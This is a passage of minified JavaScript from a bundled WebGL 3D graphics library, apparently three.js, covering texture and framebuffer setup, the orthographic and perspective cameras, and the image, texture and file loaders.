a=0;a<6;a++)t.deleteFramebuffer(i.__webglFramebuffer[a]),i.__webglDepthbuffer&&t.deleteRenderbuffer(i.__webglDepthbuffer[a]);else t.deleteFramebuffer(i.__webglFramebuffer),i.__webglDepthbuffer&&t.deleteRenderbuffer(i.__webglDepthbuffer);n.remove(e.texture),n.remove(e)}}(i),o.memory.textures--}function y(e,r){var a=n.get(e);if(e.isVideoTexture&&function(t){var e=t.id,i=o.render.frame;l[e]!==i&&(l[e]=i,t.update())}(e),e.version>0&&a.__version!==e.version){var s=e.image;if(void 0===s);else if(!1!==s.complete)return void w(a,e,r)}i.activeTexture(t.TEXTURE0+r),i.bindTexture(t.TEXTURE_2D,a.__webglTexture)}function x(i,o,s){var l;if(s?(t.texParameteri(i,t.TEXTURE_WRAP_S,a.convert(o.wrapS)),t.texParameteri(i,t.TEXTURE_WRAP_T,a.convert(o.wrapT)),i===t.TEXTURE_3D&&t.texParameteri(i,t.TEXTURE_WRAP_R,a.convert(o.wrapR)),t.texParameteri(i,t.TEXTURE_MAG_FILTER,a.convert(o.magFilter)),t.texParameteri(i,t.TEXTURE_MIN_FILTER,a.convert(o.minFilter))):(t.texParameteri(i,t.TEXTURE_WRAP_S,t.CLAMP_TO_EDGE),t.texParameteri(i,t.TEXTURE_WRAP_T,t.CLAMP_TO_EDGE),i===t.TEXTURE_3D&&t.texParameteri(i,t.TEXTURE_WRAP_R,t.CLAMP_TO_EDGE),o.wrapS!==kt||o.wrapT,t.texParameteri(i,t.TEXTURE_MAG_FILTER,_(o.magFilter)),t.texParameteri(i,t.TEXTURE_MIN_FILTER,_(o.minFilter)),o.minFilter!==Pt&&o.minFilter),l=e.get("EXT_texture_filter_anisotropic")){if(o.type===zt&&null===e.get("OES_texture_float_linear"))return;if(o.type===Dt&&null===(r.isWebGL2||e.get("OES_texture_half_float_linear")))return;(o.anisotropy>1||n.get(o).__currentAnisotropy)&&(t.texParameterf(i,l.TEXTURE_MAX_ANISOTROPY_EXT,Math.min(o.anisotropy,r.getMaxAnisotropy())),n.get(o).__currentAnisotropy=o.anisotropy)}}function b(e,i){void 0===e.__webglInit&&(e.__webglInit=!0,i.addEventListener("dispose",g),e.__webglTexture=t.createTexture(),o.memory.textures++)}function w(e,n,o){var s=n.isDataTexture3D?t.TEXTURE_3D:t.TEXTURE_2D;b(e,n),i.activeTexture(t.TEXTURE0+o),i.bindTexture(s,e.__webglTexture),t.pixelStorei(t.UNPACK_FLIP_Y_WEBGL,n.flipY),t.pixelStorei(t.UNPACK_PREMULTIPLY_ALPHA_WEBGL,n.premultiplyAlpha),t.pixelStorei(t.UNPACK_ALIGNMENT,n.unpackAlignment);var l=function(t){return!r.isWebGL2&&(t.wrapS!==kt||t.wrapT!==kt||t.minFilter!==Pt&&t.minFilter!==Rt)}(n)&&!1===d(n.image),c=u(n.image,l,!1,r.maxTextureSize),h=d(c)||r.isWebGL2,_=a.convert(n.format),g=a.convert(n.type),v=m(_,g);x(s,n,h);var y,w=n.mipmaps;if(n.isDepthTexture){if(v=t.DEPTH_COMPONENT,n.type===zt){if(!r.isWebGL2)throw new Error("Float Depth Texture only supported in WebGL2.0");v=t.DEPTH_COMPONENT32F}else r.isWebGL2&&(v=t.DEPTH_COMPONENT16);n.format===jt&&v===t.DEPTH_COMPONENT&&n.type!==Nt&&1014!==n.type&&(n.type=Nt,g=a.convert(n.type)),n.format===Wt&&(v=t.DEPTH_STENCIL,n.type!==Gt&&(n.type=Gt,g=a.convert(n.type))),i.texImage2D(t.TEXTURE_2D,0,v,c.width,c.height,0,_,g,null)}else if(n.isDataTexture)if(w.length>0&&h){for(var T=0,S=w.length;T<S;T++)y=w[T],i.texImage2D(t.TEXTURE_2D,T,v,y.width,y.height,0,_,g,y.data);n.generateMipmaps=!1,e.__maxMipLevel=w.length-1}else i.texImage2D(t.TEXTURE_2D,0,v,c.width,c.height,0,_,g,c.data),e.__maxMipLevel=0;else if(n.isCompressedTexture){for(T=0,S=w.length;T<S;T++)y=w[T],n.format!==Bt&&n.format!==Ut?i.getCompressedTextureFormats().indexOf(_)>-1&&i.compressedTexImage2D(t.TEXTURE_2D,T,v,y.width,y.height,0,y.data):i.texImage2D(t.TEXTURE_2D,T,v,y.width,y.height,0,_,g,y.data);e.__maxMipLevel=w.length-1}else if(n.isDataTexture3D)i.texImage3D(t.TEXTURE_3D,0,v,c.width,c.height,c.depth,0,_,g,c.data),e.__maxMipLevel=0;else if(w.length>0&&h){for(T=0,S=w.length;T<S;T++)y=w[T],i.texImage2D(t.TEXTURE_2D,T,v,_,g,y);n.generateMipmaps=!1,e.__maxMipLevel=w.length-1}else i.texImage2D(t.TEXTURE_2D,0,v,_,g,c),e.__maxMipLevel=0;p(n,h)&&f(t.TEXTURE_2D,n,c.width,c.height),e.__version=n.version,n.onUpdate&&n.onUpdate(n)}function T(e,r,o,s){var l=a.convert(r.texture.format),c=a.convert(r.texture.type),h=m(l,c);i.texImage2D(s,0,h,r.width,r.height,0,l,c,null),t.bindFramebuffer(t.FRAMEBUFFER,e),t.framebufferTexture2D(t.FRAMEBUFFER,o,s,n.get(r.texture).__webglTexture,0),t.bindFramebuffer(t.FRAMEBUFFER,null)}function S(e,i,n){if(t.bindRenderbuffer(t.RENDERBUFFER,e),i.depthBuffer&&!i.stencilBuffer){if(n){var r=E(i);t.renderbufferStorageMultisample(t.RENDERBUFFER,r,t.DEPTH_COMPONENT16,i.width,i.height)}else t.renderbufferStorage(t.RENDERBUFFER,t.DEPTH_COMPONENT16,i.width,i.height);t.framebufferRenderbuffer(t.FRAMEBUFFER,t.DEPTH_ATTACHMENT,t.RENDERBUFFER,e)}else if(i.depthBuffer&&i.stencilBuffer)n?(r=E(i),t.renderbufferStorageMultisample(t.RENDERBUFFER,r,t.DEPTH_STENCIL,i.width,i.height)):t.renderbufferStorage(t.RENDERBUFFER,t.DEPTH_STENCIL,i.width,i.height),t.framebufferRenderbuffer(t.FRAMEBUFFER,t.DEPTH_STENCIL_ATTACHMENT,t.RENDERBUFFER,e);else{var o=m(a.convert(i.texture.format),a.convert(i.texture.type));n?(r=E(i),t.renderbufferStorageMultisample(t.RENDERBUFFER,r,o,i.width,i.height)):t.renderbufferStorage(t.RENDERBUFFER,o,i.width,i.height)}t.bindRenderbuffer(t.RENDERBUFFER,null)}function M(e){var i=n.get(e),r=!0===e.isWebGLRenderTargetCube;if(e.depthTexture){if(r)throw new Error("target.depthTexture not supported in Cube render targets");!function(e,i){if(i&&i.isWebGLRenderTargetCube)throw new Error("Depth Texture with cube render targets is not supported");if(t.bindFramebuffer(t.FRAMEBUFFER,e),!i.depthTexture||!i.depthTexture.isDepthTexture)throw new Error("renderTarget.depthTexture must be an instance of DepthTexture");n.get(i.depthTexture).__webglTexture&&i.depthTexture.image.width===i.width&&i.depthTexture.image.height===i.height||(i.depthTexture.image.width=i.width,i.depthTexture.image.height=i.height,i.depthTexture.needsUpdate=!0),y(i.depthTexture,0);var r=n.get(i.depthTexture).__webglTexture;if(i.depthTexture.format===jt)t.framebufferTexture2D(t.FRAMEBUFFER,t.DEPTH_ATTACHMENT,t.TEXTURE_2D,r,0);else{if(i.depthTexture.format!==Wt)throw new Error("Unknown depthTexture format");t.framebufferTexture2D(t.FRAMEBUFFER,t.DEPTH_STENCIL_ATTACHMENT,t.TEXTURE_2D,r,0)}}(i.__webglFramebuffer,e)}else if(r){i.__webglDepthbuffer=[];for(var a=0;a<6;a++)t.bindFramebuffer(t.FRAMEBUFFER,i.__webglFramebuffer[a]),i.__webglDepthbuffer[a]=t.createRenderbuffer(),S(i.__webglDepthbuffer[a],e)}else t.bindFramebuffer(t.FRAMEBUFFER,i.__webglFramebuffer),i.__webglDepthbuffer=t.createRenderbuffer(),S(i.__webglDepthbuffer,e);t.bindFramebuffer(t.FRAMEBUFFER,null)}function E(t){return r.isWebGL2&&t.isWebGLMultisampleRenderTarget?Math.min(r.maxSamples,t.samples):0}this.setTexture2D=y,this.setTexture3D=function(e,r){var a=n.get(e);e.version>0&&a.__version!==e.version?w(a,e,r):(i.activeTexture(t.TEXTURE0+r),i.bindTexture(t.TEXTURE_3D,a.__webglTexture))},this.setTextureCube=function(e,o){var s=n.get(e);if(6===e.image.length)if(e.version>0&&s.__version!==e.version){b(s,e),i.activeTexture(t.TEXTURE0+o),i.bindTexture(t.TEXTURE_CUBE_MAP,s.__webglTexture),t.pixelStorei(t.UNPACK_FLIP_Y_WEBGL,e.flipY);for(var l=e&&e.isCompressedTexture,c=e.image[0]&&e.image[0].isDataTexture,h=[],_=0;_<6;_++)h[_]=l||c?c?e.image[_].image:e.image[_]:u(e.image[_],!1,!0,r.maxCubemapSize);var g=h[0],v=d(g)||r.isWebGL2,y=a.convert(e.format),w=a.convert(e.type),T=m(y,w);for(x(t.TEXTURE_CUBE_MAP,e,v),_=0;_<6;_++)if(l)for(var S,M=h[_].mipmaps,E=0,L=M.length;E<L;E++)S=M[E],e.format!==Bt&&e.format!==Ut?i.getCompressedTextureFormats().indexOf(y)>-1&&i.compressedTexImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+_,E,T,S.width,S.height,0,S.data):i.texImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+_,E,T,S.width,S.height,0,y,w,S.data);else c?i.texImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+_,0,T,h[_].width,h[_].height,0,y,w,h[_].data):i.texImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+_,0,T,y,w,h[_]);s.__maxMipLevel=l?M.length-1:0,p(e,v)&&f(t.TEXTURE_CUBE_MAP,e,g.width,g.height),s.__version=e.version,e.onUpdate&&e.onUpdate(e)}else i.activeTexture(t.TEXTURE0+o),i.bindTexture(t.TEXTURE_CUBE_MAP,s.__webglTexture)},this.setTextureCubeDynamic=function(e,r){i.activeTexture(t.TEXTURE0+r),i.bindTexture(t.TEXTURE_CUBE_MAP,n.get(e).__webglTexture)},this.setupRenderTarget=function(e){var s=n.get(e),l=n.get(e.texture);e.addEventListener("dispose",v),l.__webglTexture=t.createTexture(),o.memory.textures++;var c=!0===e.isWebGLRenderTargetCube,h=!0===e.isWebGLMultisampleRenderTarget,u=d(e)||r.isWebGL2;if(c){s.__webglFramebuffer=[];for(var _=0;_<6;_++)s.__webglFramebuffer[_]=t.createFramebuffer()}else if(s.__webglFramebuffer=t.createFramebuffer(),h&&r.isWebGL2){s.__webglMultisampledFramebuffer=t.createFramebuffer(),s.__webglColorRenderbuffer=t.createRenderbuffer(),t.bindRenderbuffer(t.RENDERBUFFER,s.__webglColorRenderbuffer);var g=m(a.convert(e.texture.format),a.convert(e.texture.type)),y=E(e);t.renderbufferStorageMultisample(t.RENDERBUFFER,y,g,e.width,e.height),t.bindFramebuffer(t.FRAMEBUFFER,s.__webglMultisampledFramebuffer),t.framebufferRenderbuffer(t.FRAMEBUFFER,t.COLOR_ATTACHMENT0,t.RENDERBUFFER,s.__webglColorRenderbuffer),t.bindRenderbuffer(t.RENDERBUFFER,null),e.depthBuffer&&(s.__webglDepthRenderbuffer=t.createRenderbuffer(),S(s.__webglDepthRenderbuffer,e,!0)),t.bindFramebuffer(t.FRAMEBUFFER,null)}if(c){for(i.bindTexture(t.TEXTURE_CUBE_MAP,l.__webglTexture),x(t.TEXTURE_CUBE_MAP,e.texture,u),_=0;_<6;_++)T(s.__webglFramebuffer[_],e,t.COLOR_ATTACHMENT0,t.TEXTURE_CUBE_MAP_POSITIVE_X+_);p(e.texture,u)&&f(t.TEXTURE_CUBE_MAP,e.texture,e.width,e.height),i.bindTexture(t.TEXTURE_CUBE_MAP,null)}else i.bindTexture(t.TEXTURE_2D,l.__webglTexture),x(t.TEXTURE_2D,e.texture,u),T(s.__webglFramebuffer,e,t.COLOR_ATTACHMENT0,t.TEXTURE_2D),p(e.texture,u)&&f(t.TEXTURE_2D,e.texture,e.width,e.height),i.bindTexture(t.TEXTURE_2D,null);e.depthBuffer&&M(e)},this.updateRenderTargetMipmap=function(e){var a=e.texture;if(p(a,d(e)||r.isWebGL2)){var o=e.isWebGLRenderTargetCube?t.TEXTURE_CUBE_MAP:t.TEXTURE_2D,s=n.get(a).__webglTexture;i.bindTexture(o,s),f(o,a,e.width,e.height),i.bindTexture(o,null)}},this.updateMultisampleRenderTarget=function(e){if(e.isWebGLMultisampleRenderTarget&&r.isWebGL2){var i=n.get(e);t.bindFramebuffer(t.READ_FRAMEBUFFER,i.__webglMultisampledFramebuffer),t.bindFramebuffer(t.DRAW_FRAMEBUFFER,i.__webglFramebuffer);var a=e.width,o=e.height,s=t.COLOR_BUFFER_BIT;e.depthBuffer&&(s|=t.DEPTH_BUFFER_BIT),e.stencilBuffer&&(s|=t.STENCIL_BUFFER_BIT),t.blitFramebuffer(0,0,a,o,0,0,a,o,s,t.NEAREST)}}}function Qn(t,e,i){return{convert:function(n){var r;if(n===Lt)return t.REPEAT;if(n===kt)return t.CLAMP_TO_EDGE;if(n===At)return t.MIRRORED_REPEAT;if(n===Pt)return t.NEAREST;if(n===Ot)return t.NEAREST_MIPMAP_NEAREST;if(n===Ct)return t.NEAREST_MIPMAP_LINEAR;if(n===Rt)return t.LINEAR;if(1007===n)return t.LINEAR_MIPMAP_NEAREST;if(n===It)return t.LINEAR_MIPMAP_LINEAR;if(n===Ft)return t.UNSIGNED_BYTE;if(1017===n)return t.UNSIGNED_SHORT_4_4_4_4;if(1018===n)return t.UNSIGNED_SHORT_5_5_5_1;if(1019===n)return t.UNSIGNED_SHORT_5_6_5;if(1010===n)return t.BYTE;if(1011===n)return t.SHORT;if(n===Nt)return t.UNSIGNED_SHORT;if(1013===n)return t.INT;if(1014===n)return t.UNSIGNED_INT;if(n===zt)return t.FLOAT;if(n===Dt){if(i.isWebGL2)return t.HALF_FLOAT;if(null!==(r=e.get("OES_texture_half_float")))return r.HALF_FLOAT_OES}if(1021===n)return t.ALPHA;if(n===Ut)return t.RGB;if(n===Bt)return t.RGBA;if(1024===n)return t.LUMINANCE;if(1025===n)return t.LUMINANCE_ALPHA;if(n===jt)return t.DEPTH_COMPONENT;if(n===Wt)return t.DEPTH_STENCIL;if(1028===n)return t.RED;if(n===Et)return t.FUNC_ADD;if(101===n)return t.FUNC_SUBTRACT;if(102===n)return t.FUNC_REVERSE_SUBTRACT;if(200===n)return t.ZERO;if(201===n)return t.ONE;if(202===n)return t.SRC_COLOR;if(203===n)return t.ONE_MINUS_SRC_COLOR;if(204===n)return t.SRC_ALPHA;if(205===n)return t.ONE_MINUS_SRC_ALPHA;if(206===n)return t.DST_ALPHA;if(207===n)return t.ONE_MINUS_DST_ALPHA;if(208===n)return t.DST_COLOR;if(209===n)return t.ONE_MINUS_DST_COLOR;if(210===n)return t.SRC_ALPHA_SATURATE;if((n===Ht||33777===n||n===Vt||n===Yt)&&null!==(r=e.get("WEBGL_compressed_texture_s3tc"))){if(n===Ht)return r.COMPRESSED_RGB_S3TC_DXT1_EXT;if(33777===n)return r.COMPRESSED_RGBA_S3TC_DXT1_EXT;if(n===Vt)return r.COMPRESSED_RGBA_S3TC_DXT3_EXT;if(n===Yt)return r.COMPRESSED_RGBA_S3TC_DXT5_EXT}if((35840===n||35841===n||35842===n||35843===n)&&null!==(r=e.get("WEBGL_compressed_texture_pvrtc"))){if(35840===n)return r.COMPRESSED_RGB_PVRTC_4BPPV1_IMG;if(35841===n)return r.COMPRESSED_RGB_PVRTC_2BPPV1_IMG;if(35842===n)return r.COMPRESSED_RGBA_PVRTC_4BPPV1_IMG;if(35843===n)return r.COMPRESSED_RGBA_PVRTC_2BPPV1_IMG}if(36196===n&&null!==(r=e.get("WEBGL_compressed_texture_etc1")))return r.COMPRESSED_RGB_ETC1_WEBGL;if((37808===n||37809===n||37810===n||37811===n||37812===n||37813===n||37814===n||37815===n||37816===n||37817===n||37818===n||37819===n||37820===n||37821===n)&&null!==(r=e.get("WEBGL_compressed_texture_astc")))return n;if(103===n||104===n){if(i.isWebGL2){if(103===n)return t.MIN;if(104===n)return t.MAX}if(null!==(r=e.get("EXT_blend_minmax"))){if(103===n)return r.MIN_EXT;if(104===n)return r.MAX_EXT}}if(n===Gt){if(i.isWebGL2)return t.UNSIGNED_INT_24_8;if(null!==(r=e.get("WEBGL_depth_texture")))return r.UNSIGNED_INT_24_8_WEBGL}return 0}}}function tr(t,e,i){this.width=t,this.height=e,this.scissor=new ke(0,0,t,e),this.scissorTest=!1,this.viewport=new ke(0,0,t,e),i=i||{},this.texture=new he(void 0,void 0,i.wrapS,i.wrapT,i.magFilter,i.minFilter,i.format,i.type,i.anisotropy,i.encoding),this.texture.generateMipmaps=void 0!==i.generateMipmaps&&i.generateMipmaps,this.texture.minFilter=void 0!==i.minFilter?i.minFilter:Rt,this.depthBuffer=void 0===i.depthBuffer||i.depthBuffer,this.stencilBuffer=void 0===i.stencilBuffer||i.stencilBuffer,this.depthTexture=void 0!==i.depthTexture?i.depthTexture:null}function er(t){this.autoStart=void 0===t||t,this.startTime=0,this.oldTime=0,this.elapsedTime=0,this.running=!1}function ir(){De.call(this),this.type="Scene",this.background=null,this.fog=null,this.overrideMaterial=null,this.autoUpdate=!0}function nr(){De.call(this),this.type="Camera",this.matrixWorldInverse=new Qt,this.projectionMatrix=new Qt,this.projectionMatrixInverse=new Qt}function rr(t,e,i,n,r,a){nr.call(this),this.type="OrthographicCamera",this.zoom=1,this.view=null,this.left=void 0!==t?t:-1,this.right=void 0!==e?e:1,this.top=void 0!==i?i:1,this.bottom=void 0!==n?n:-1,this.near=void 0!==r?r:.1,this.far=void 0!==a?a:2e3,this.updateProjectionMatrix()}function ar(t,e,i,n){nr.call(this),this.type="PerspectiveCamera",this.fov=void 0!==t?t:50,this.zoom=1,this.near=void 0!==i?i:.1,this.far=void 0!==n?n:2e3,this.focus=10,this.aspect=void 0!==e?e:1,this.view=null,this.filmGauge=35,this.filmOffset=0,this.updateProjectionMatrix()}function or(){De.call(this),this.type="Group"}function sr(t,e,i,n,r,a,o,s,l){he.call(this,t,e,i,n,r,a,o,s,l),this.format=void 0!==o?o:Ut,this.minFilter=void 0!==a?a:Rt,this.magFilter=void 0!==r?r:Rt,this.generateMipmaps=!1}function lr(t,e,i){var n=this,r=!1,a=0,o=0,s=void 0;this.onStart=void 0,this.onLoad=t,this.onProgress=e,this.onError=i,this.itemStart=function(t){o++,!1===r&&void 0!==n.onStart&&n.onStart(t,a,o),r=!0},this.itemEnd=function(t){a++,void 0!==n.onProgress&&n.onProgress(t,a,o),a===o&&(r=!1,void 0!==n.onLoad&&n.onLoad())},this.itemError=function(t){void 0!==n.onError&&n.onError(t)},this.resolveURL=function(t){return s?s(t):t},this.setURLModifier=function(t){return s=t,this}}tr.prototype=Object.assign(Object.create(Kt.prototype),{constructor:tr,isWebGLRenderTarget:!0,setSize:function(t,e){this.width===t&&this.height===e||(this.width=t,this.height=e,this.dispose()),this.viewport.set(0,0,t,e),this.scissor.set(0,0,t,e)},clone:function(){return(new this.constructor).copy(this)},copy:function(t){return this.width=t.width,this.height=t.height,this.viewport.copy(t.viewport),this.texture=t.texture.clone(),this.depthBuffer=t.depthBuffer,this.stencilBuffer=t.stencilBuffer,this.depthTexture=t.depthTexture,this},dispose:function(){this.dispatchEvent({type:"dispose"})}}),Object.assign(er.prototype,{start:function(){this.startTime=("undefined"==typeof performance?Date:performance).now(),this.oldTime=this.startTime,this.elapsedTime=0,this.running=!0},stop:function(){this.getElapsedTime(),this.running=!1,this.autoStart=!1},getElapsedTime:function(){return this.getDelta(),this.elapsedTime},getDelta:function(){var t=0;if(this.autoStart&&!this.running)return this.start(),0;if(this.running){var e=("undefined"==typeof performance?Date:performance).now();t=(e-this.oldTime)/1e3,this.oldTime=e,this.elapsedTime+=t}return t}}),ir.prototype=Object.assign(Object.create(De.prototype),{constructor:ir,isScene:!0,copy:function(t,e){return De.prototype.copy.call(this,t,e),null!==t.background&&(this.background=t.background.clone()),null!==t.fog&&(this.fog=t.fog.clone()),null!==t.overrideMaterial&&(this.overrideMaterial=t.overrideMaterial.clone()),this.autoUpdate=t.autoUpdate,this.matrixAutoUpdate=t.matrixAutoUpdate,this},toJSON:function(t){var e=De.prototype.toJSON.call(this,t);return null!==this.background&&(e.object.background=this.background.toJSON(t)),null!==this.fog&&(e.object.fog=this.fog.toJSON()),e},dispose:function(){this.dispatchEvent({type:"dispose"})}}),nr.prototype=Object.assign(Object.create(De.prototype),{constructor:nr,isCamera:!0,copy:function(t,e){return De.prototype.copy.call(this,t,e),this.matrixWorldInverse.copy(t.matrixWorldInverse),this.projectionMatrix.copy(t.projectionMatrix),this.projectionMatrixInverse.copy(t.projectionMatrixInverse),this},getWorldDirection:function(t){void 0===t&&(t=new ee),this.updateMatrixWorld(!0);var e=this.matrixWorld.elements;return t.set(-e[8],-e[9],-e[10]).normalize()},updateMatrixWorld:function(t){De.prototype.updateMatrixWorld.call(this,t),this.matrixWorldInverse.getInverse(this.matrixWorld)},clone:function(){return(new this.constructor).copy(this)}}),rr.prototype=Object.assign(Object.create(nr.prototype),{constructor:rr,isOrthographicCamera:!0,copy:function(t,e){return nr.prototype.copy.call(this,t,e),this.left=t.left,this.right=t.right,this.top=t.top,this.bottom=t.bottom,this.near=t.near,this.far=t.far,this.zoom=t.zoom,this.view=null===t.view?null:Object.assign({},t.view),this},setViewOffset:function(t,e,i,n,r,a){null===this.view&&(this.view={enabled:!0,fullWidth:1,fullHeight:1,offsetX:0,offsetY:0,width:1,height:1}),this.view.enabled=!0,this.view.fullWidth=t,this.view.fullHeight=e,this.view.offsetX=i,this.view.offsetY=n,this.view.width=r,this.view.height=a,this.updateProjectionMatrix()},clearViewOffset:function(){null!==this.view&&(this.view.enabled=!1),this.updateProjectionMatrix()},updateProjectionMatrix:function(){var t=(this.right-this.left)/(2*this.zoom),e=(this.top-this.bottom)/(2*this.zoom),i=(this.right+this.left)/2,n=(this.top+this.bottom)/2,r=i-t,a=i+t,o=n+e,s=n-e;if(null!==this.view&&this.view.enabled){var l=this.zoom/(this.view.width/this.view.fullWidth),c=this.zoom/(this.view.height/this.view.fullHeight),h=(this.right-this.left)/this.view.width,u=(this.top-this.bottom)/this.view.height;a=(r+=h*(this.view.offsetX/l))+h*(this.view.width/l),s=(o-=u*(this.view.offsetY/c))-u*(this.view.height/c)}this.projectionMatrix.makeOrthographic(r,a,o,s,this.near,this.far),this.projectionMatrixInverse.getInverse(this.projectionMatrix)},toJSON:function(t){var e=De.prototype.toJSON.call(this,t);return e.object.zoom=this.zoom,e.object.left=this.left,e.object.right=this.right,e.object.top=this.top,e.object.bottom=this.bottom,e.object.near=this.near,e.object.far=this.far,null!==this.view&&(e.object.view=Object.assign({},this.view)),e}}),ar.prototype=Object.assign(Object.create(nr.prototype),{constructor:ar,isPerspectiveCamera:!0,copy:function(t,e){return nr.prototype.copy.call(this,t,e),this.fov=t.fov,this.zoom=t.zoom,this.near=t.near,this.far=t.far,this.focus=t.focus,this.aspect=t.aspect,this.view=null===t.view?null:Object.assign({},t.view),this.filmGauge=t.filmGauge,this.filmOffset=t.filmOffset,this},setFocalLength:function(t){var e=.5*this.getFilmHeight()/t;this.fov=2*Zt.RAD2DEG*Math.atan(e),this.updateProjectionMatrix()},getFocalLength:function(){var t=Math.tan(.5*Zt.DEG2RAD*this.fov);return.5*this.getFilmHeight()/t},getEffectiveFOV:function(){return 2*Zt.RAD2DEG*Math.atan(Math.tan(.5*Zt.DEG2RAD*this.fov)/this.zoom)},getFilmWidth:function(){return this.filmGauge*Math.min(this.aspect,1)},getFilmHeight:function(){return this.filmGauge/Math.max(this.aspect,1)},setViewOffset:function(t,e,i,n,r,a){this.aspect=t/e,null===this.view&&(this.view={enabled:!0,fullWidth:1,fullHeight:1,offsetX:0,offsetY:0,width:1,height:1}),this.view.enabled=!0,this.view.fullWidth=t,this.view.fullHeight=e,this.view.offsetX=i,this.view.offsetY=n,this.view.width=r,this.view.height=a,this.updateProjectionMatrix()},clearViewOffset:function(){null!==this.view&&(this.view.enabled=!1),this.updateProjectionMatrix()},updateProjectionMatrix:function(){var t=this.near,e=t*Math.tan(.5*Zt.DEG2RAD*this.fov)/this.zoom,i=2*e,n=this.aspect*i,r=-.5*n,a=this.view;if(null!==this.view&&this.view.enabled){var o=a.fullWidth,s=a.fullHeight;r+=a.offsetX*n/o,e-=a.offsetY*i/s,n*=a.width/o,i*=a.height/s}var l=this.filmOffset;0!==l&&(r+=t*l/this.getFilmWidth()),this.projectionMatrix.makePerspective(r,r+n,e,e-i,t,this.far),this.projectionMatrixInverse.getInverse(this.projectionMatrix)},toJSON:function(t){var e=De.prototype.toJSON.call(this,t);return e.object.fov=this.fov,e.object.zoom=this.zoom,e.object.near=this.near,e.object.far=this.far,e.object.focus=this.focus,e.object.aspect=this.aspect,null!==this.view&&(e.object.view=Object.assign({},this.view)),e.object.filmGauge=this.filmGauge,e.object.filmOffset=this.filmOffset,e}}),or.prototype=Object.assign(Object.create(De.prototype),{constructor:or,isGroup:!0}),sr.prototype=Object.assign(Object.create(he.prototype),{constructor:sr,isVideoTexture:!0,update:function(){var t=this.image;t.readyState>=t.HAVE_CURRENT_DATA&&(this.needsUpdate=!0)}});var cr=new lr,hr=(i(139),{enabled:!1,files:{},add:function(t,e){!1!==this.enabled&&(this.files[t]=e)},get:function(t){if(!1!==this.enabled)return this.files[t]},remove:function(t){delete this.files[t]},clear:function(){this.files={}}});function ur(t){this.manager=void 0!==t?t:cr}function dr(t){this.manager=void 0!==t?t:cr}Object.assign(ur.prototype,{crossOrigin:"anonymous",load:function(t,e,i,n){void 0===t&&(t=""),void 0!==this.path&&(t=this.path+t),t=this.manager.resolveURL(t);var r=this,a=hr.get(t);if(void 0!==a)return r.manager.itemStart(t),setTimeout((function(){e&&e(a),r.manager.itemEnd(t)}),0),a;var o=document.createElementNS("http://www.w3.org/1999/xhtml","img");function s(){o.removeEventListener("load",s,!1),o.removeEventListener("error",l,!1),hr.add(t,this),e&&e(this),r.manager.itemEnd(t)}function l(e){o.removeEventListener("load",s,!1),o.removeEventListener("error",l,!1),n&&n(e),r.manager.itemError(t),r.manager.itemEnd(t)}return o.addEventListener("load",s,!1),o.addEventListener("error",l,!1),"data:"!==t.substr(0,5)&&void 0!==this.crossOrigin&&(o.crossOrigin=this.crossOrigin),r.manager.itemStart(t),o.src=t,o},setCrossOrigin:function(t){return this.crossOrigin=t,this},setPath:function(t){return this.path=t,this}}),Object.assign(dr.prototype,{crossOrigin:"anonymous",load:function(t,e,i,n){var r=new he,a=new ur(this.manager);return a.setCrossOrigin(this.crossOrigin),a.setPath(this.path),a.load(t,(function(i){r.image=i;var n=t.search(/\.jpe?g($|\?)/i)>0||0===t.search(/^data\:image\/jpeg/);r.format=n?Ut:Bt,r.needsUpdate=!0,void 0!==e&&e(r)}),i,n),r},setCrossOrigin:function(t){return this.crossOrigin=t,this},setPath:function(t){return this.path=t,this}});var pr=i(7);function fr(t,e,i,n){this.parameterPositions=t,this._cachedIndex=0,this.resultBuffer=void 0!==n?n:new e.constructor(i),this.sampleValues=e,this.valueSize=i}i(156),Object.assign(fr.prototype,{evaluate:function(t){var e=this.parameterPositions,i=this._cachedIndex,n=e[i],r=e[i-1];t:{e:{var a;i:{n:if(!(t<n)){for(var o=i+2;;){if(void 0===n){if(t<r)break n;return i=e.length,this._cachedIndex=i,this.afterEnd_(i-1,t,r)}if(i===o)break;if(r=n,t<(n=e[++i]))break e}a=e.length;break i}if(t>=r)break t;var s=e[1];for(t<s&&(i=2,r=s),o=i-2;;){if(void 0===r)return this._cachedIndex=0,this.beforeStart_(0,t,n);if(i===o)break;if(n=r,t>=(r=e[--i-1]))break e}a=i,i=0}for(;i<a;){var l=i+a>>>1;t<e[l]?a=l:i=l+1}if(n=e[i],void 0===(r=e[i-1]))return this._cachedIndex=0,this.beforeStart_(0,t,n);if(void 0===n)return i=e.length,this._cachedIndex=i,this.afterEnd_(i-1,r,t)}this._cachedIndex=i,this.intervalChanged_(i,r,n)}return this.interpolate_(i,r,t,n)},settings:null,DefaultSettings_:{},getSettings_:function(){return this.settings||this.DefaultSettings_},copySampleValue_:function(t){for(var e=this.resultBuffer,i=this.sampleValues,n=this.valueSize,r=t*n,a=0;a!==n;++a)e[a]=i[r+a];return e},interpolate_:function(){throw new Error("call to abstract method")},intervalChanged_:function(){}}),Object.assign(fr.prototype,{beforeStart_:fr.prototype.copySampleValue_,afterEnd_:fr.prototype.copySampleValue_});var mr={};function _r(t){this.manager=void 0!==t?t:cr}function gr(t,e,i,n,r,a,o,s,l,c,h,u){he.call(this,null,a,o,s,l,c,n,r,h,u),this.image={width:e,height:i},this.mipmaps=t,this.flipY=!1,this.generateMipmaps=!1}function vr(t){this.manager=void 0!==t?t:cr,this._parser=null}Object.assign(_r.prototype,{load:function(t,e,i,n){void 0===t&&(t=""),void 0!==this.path&&(t=this.path+t),t=this.manager.resolveURL(t);var r=this,a=hr.get(t);if(void 0!==a)return r.manager.itemStart(t),setTimeout((function(){e&&e(a),r.manager.itemEnd(t)}),0),a;if(void 0===mr[t]){var o=t.match(/^data:(.*?)(;base64)?,(.*)$/);if(o){var s=o[1],l=!!o[2],c=o[3];c=decodeURIComponent(c),l&&(c=atob(c));try{var h,u=(this.responseType||"").toLowerCase();switch(u){case"arraybuffer":case"blob":for(var d=new Uint8Array(c.length),p=0;p<c.length;p++)d[p]=c.charCodeAt(p);h="blob"===u?new Blob([d.buffer],{type:s}):d.buffer;break;case"document":var f=new 